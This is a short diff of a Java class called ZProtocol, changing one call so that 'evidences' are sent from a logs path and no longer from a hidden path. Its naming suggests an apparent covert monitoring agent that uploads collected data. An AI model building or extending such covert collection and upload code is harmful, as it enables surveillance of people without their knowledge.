@@ -212,7 +212,7 @@ public class ZProtocol extends Protocol {
 		debug.info("***** Log *****");
 		// #endif
 
-		sendEvidences(Path.hidden());
+		sendEvidences(Path.logs());
 	}
 
 	private void end() throws TransportException, ProtocolException,
